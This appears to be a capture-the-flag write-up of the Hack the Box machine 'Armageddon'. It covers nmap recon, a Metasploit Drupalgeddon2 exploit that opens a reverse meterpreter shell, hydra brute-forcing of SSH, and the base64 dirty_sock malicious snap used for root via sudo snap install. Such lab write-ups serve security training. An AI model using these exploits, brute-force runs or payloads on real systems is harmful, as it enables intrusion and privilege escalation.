![](assets/Pasted%20image%2020241003213029.png)
# Machine Name: Armageddon
**Platform:** Hack the Box
**Difficulty:** Easy
**OS:** Linux
## Introduction

Armageddon is an easy difficulty machine. An exploitable Drupal website allows access to the remote host. Enumeration of the Drupal file structure reveals credentials that allows us to connect to the MySQL server, and eventually extract the hash that is reusable for a system user. Using these credentials, we can connect to the remote machine over SSH. This user is allowed to install applications using the `snap` package manager. Privilege escalation is possible by uploading and installing to the host, a malicious application using Snapcraft.lenge.

## Recon

* **Nmap Scan:** `nmap armageddon.htb -T4 -Pn -sVC -oN ~/Desktop/nmap/armageddon.txt`

```bash
 Nmap 7.94SVN scan initiated Thu Oct  3 07:33:55 2024 as: nmap -T4 -Pn -sVC -oN /home/pochify/Desktop/nmap/armageddon.txt armageddon.htb
Nmap scan report for armageddon.htb (10.129.48.89)
Host is up (0.079s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to  Armageddon |  Armageddon
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct  3 07:34:06 2024 -- 1 IP address (1 host up) scanned in 11.64 seconds

```

Vulnerability scan: `nmap --script vuln armageddon.htb`

```bash
# Nmap 7.94SVN scan initiated Thu Oct  3 07:42:07 2024 as: nmap --script vuln -oN nmap/armageddon_vuln.txt armageddon armageddon.htb
Failed to resolve "armageddon".
Nmap scan report for armageddon.htb (10.129.48.89)
Host is up (0.080s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-trace: TRACE is enabled
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=armageddon.htb
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://armageddon.htb:80/
|     Form id: user-login-form
|     Form action: /?q=node&destination=node
|     
|     Path: http://armageddon.htb:80/?q=user/register
|     Form id: user-register-form
|     Form action: /?q=user/register
|     
|     Path: http://armageddon.htb:80/?q=node&amp;destination=node
|     Form id: user-login-form
|     Form action: /?q=node&destination=node%3Famp%253Bdestination%3Dnode
|     
|     Path: http://armageddon.htb:80/?q=user/password
|     Form id: user-pass
|     Form action: /?q=user/password
|     
|     Path: http://armageddon.htb:80/?q=user
|     Form id: user-login
|     Form action: /?q=user
|     
|     Path: http://armageddon.htb:80/?q=node&amp;destination=node%3Famp%253Bdestination%3Dnode
|     Form id: user-login-form
|_    Form action: /?q=node&destination=node%3Famp%253Bdestination%3Dnode%253Famp%25253Bdestination%253Dnode
|_http-dombased-xss: Couldn\'t find any DOM based XSS.
| http-sql-injection: 
|   Possible sqli for queries:
|     http://armageddon.htb:80/misc/?C=D%3BO%3DA%27%20OR%20sqlspider
|     http://armageddon.htb:80/misc/?C=S%3BO%3DA%27%20OR%20sqlspider
|     http://armageddon.htb:80/misc/?C=N%3BO%3DD%27%20OR%20sqlspider
|     http://armageddon.htb:80/misc/?C=M%3BO%3DA%27%20OR%20sqlspider
|     http://armageddon.htb:80/misc/?C=N%3BO%3DA%27%20OR%20sqlspider
|     http://armageddon.htb:80/misc/?C=D%3BO%3DD%27%20OR%20sqlspider
|     http://armageddon.htb:80/misc/?C=S%3BO%3DA%27%20OR%20sqlspider
|_    http://armageddon.htb:80/misc/?C=M%3BO%3DA%27%20OR%20sqlspider
|_http-stored-xss: Couldn\'t find any stored XSS vulnerabilities.
| http-enum: 
|   /robots.txt: Robots file
|   /.gitignore: Revision control ignore file
|   /UPGRADE.txt: Drupal file
|   /INSTALL.txt: Drupal file
|   /INSTALL.mysql.txt: Drupal file
|   /INSTALL.pgsql.txt: Drupal file
|   /CHANGELOG.txt: Drupal v1
|   /: Drupal version 7 
|   /README.txt: Interesting, a readme.
|   /icons/: Potentially interesting folder w/ directory listing
|   /includes/: Potentially interesting folder w/ directory listing
|   /misc/: Potentially interesting folder w/ directory listing
|   /modules/: Potentially interesting folder w/ directory listing
|   /scripts/: Potentially interesting folder w/ directory listing
|   /sites/: Potentially interesting folder w/ directory listing
|_  /themes/: Potentially interesting folder w/ directory listing

```

The website looked simple. I tried the basic default credentials, but that did not allow my access.

![](assets/Pasted%20image%2020241003222606.png)

Looking through the `vuln` script, I found some files related to Drupal, which is the name of the CMS. The CHANEGLOG.txt specifically had interesting information.

![](../Pasted%20image%2020241003222940.png)

The basic Nmap recon did not give me the Drupal version, but this changelog seems to show  the version is `7.56`. This is good enough to use `searchsploit` or `metsploit`

## Vulnerability Identification

* **Vulnerability 1:** Drupalgeddon

Going to metasploit, I searched for `Drupal 7.56`. This did not give me any information as it seems to be too specific. When I did `search Drupal 7.5`, it gave me below options

```bash
[msf](Jobs:0 Agents:0) >> search Drupal 7.5

Matching Modules
================

   #  Name                                      Disclosure Date  Rank       Check  Description
   -  ----                                      ---------------  ----       -----  -----------
   0  exploit/unix/webapp/drupal_coder_exec     2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
   1  exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
   2  exploit/unix/webapp/drupal_restws_exec    2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
```

Based on the machine name, I assumed drupalgeddon2 is the right one

```bash

[msf](Jobs:0 Agents:0) exploit(unix/webapp/drupal_restws_exec) >> show options

Module options (exploit/unix/webapp/drupal_restws_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.h
                                         tml
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The target URI of the Drupal installation
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  94.237.93.136    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

```

Okay, it asks me for RHOSTS ( target ) and LHOST (My machine) After setting these, I ran exploit and 

```bash

msf](Jobs:0 Agents:0) exploit(unix/webapp/drupal_drupalgeddon2) >> exploit

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (39927 bytes) to 10.129.48.89
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.129.48.89:51386) at 2024-10-03 08:40:31 -0500

```

## Exploitation

* **Gaining Initial Access:**

Okay, I got access to the machine via metasploit
Now, I wanted to get more insight on users. According to [this website](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/) or [this website in Japanese ](https://linuc.org/study/knowledge/509/) , `/etc/passwd` gives you the details on users.

`cat /etc/passwd`

```bash

(Meterpreter 1)(/) > cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash

```

The last `brucetherealadmin` looks really fishy and he has his own folder under home. This is interesting.

The machine has ssh port open, so maybe I  can do something with this username...only if I have access to the account. Further looking into websites, I learned that you can (obviously) brute-force SSH using hydra ([Link](https://www.geeksforgeeks.org/how-to-use-hydra-to-brute-force-ssh-connections/))

`$ hydra -l brucetherealadmin -P /usr/share/wordlists/rockyou.txt ssh://armageddon.htb`

```bash
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-03 08:55:17
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://armageddon.htb:22/
[STATUS] 156.00 tries/min, 156 tries in 00:01h, 14344245 to do in 1532:31h, 14 active
[22][ssh] host: armageddon.htb   login: brucetherealadmin   password: booboo
1 of 1 target successfully completed, 1 valid password found
```

Hydra gave us the password **booboo**, which sounds really weird but nevermind...

```bash
ssh  brucetherealadmin@armageddon.htb 
brucetherealadmin@armageddon.htb\'s password: 
Last failed login: Thu Oct  3 14:57:54 BST 2024 from 10.10.14.2 on ssh:notty
There were 356 failed login attempts since the last successful login.
Last login: Thu Oct  3 14:12:06 2024 from 10.10.14.2

[brucetherealadmin@armageddon ~]$ ls
user.txt
[brucetherealadmin@armageddon ~]$ cat user.txt
74**********f139
```

And yay ! I got the **user.txt**

```bash

[brucetherealadmin@armageddon ~]$ id
uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) groups=1000(brucetherealadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[brucetherealadmin@armageddon ~]$ sudo -l
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR
    LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *


```

Bruce unfortunately is not a root user, but looks like he can run a command as a root ... `sudo /usr/bin/snap install`

Just running the command did not do anything. It even failed connecting to the store. 
Digging deep, I found [This Github](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py) which has the Linux Priv Escalation command called dirty_sock. What a name.

```bash

python -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A"*4256 + "=="' | base64 -d > esc.snap

sudo /usr/bin/snap install --devmode esc.snap

su dirty_sock 

```

The password for `su dirty_sock` should be `dirty_sock`. After the credential , command `sudo i` to gain root and get flag

## Lessons Learned

* `cat /etc/passwd` is a great place to check existing user
* `id`  command is useful for permission

## Conclusion

* Overall mid range Easy. I got stuck at snap installation.

**Happy hacking!**